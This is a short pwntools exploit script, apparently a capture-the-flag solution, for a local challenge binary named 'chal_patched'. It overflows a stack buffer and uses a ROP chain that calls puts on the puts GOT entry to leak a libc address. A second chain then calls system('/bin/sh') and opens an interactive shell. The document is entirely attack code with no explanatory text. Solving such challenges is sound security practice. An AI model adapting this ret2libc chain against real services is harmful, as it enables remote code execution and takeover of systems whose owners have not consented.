from pwn import *

elf =  context.binary = ELF('./chal_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

io = process()


fini_array = elf.get_section_by_name('.fini_array').header.sh_addr

payload = b'A'*72
payload += pack(0x00000000004011a7)
payload += p64(elf.got.puts)
payload += pack(0x0)
payload += pack(elf.plt.puts)
payload += pack(0x000000000040101a)
payload += p64(elf.sym.vuln)


io.sendline(payload)

io.recvuntil(b'Laundry complete')
leak = unpack(io.recvline(keepends=False),'all')
print(hex(leak))

libc.address = leak - libc.sym.puts

print(hex(libc.address))


payload = b'A'*72
payload += pack(0x00000000004011a7)
payload += pack(next(libc.search(b'/bin/sh')))
payload += pack(0x0)
#payload += pack(0x000000000040101a)
payload += pack(libc.sym.system)

#io.recvuntil(b"Add your laundry:")
io.sendline(payload)

io.interactive()
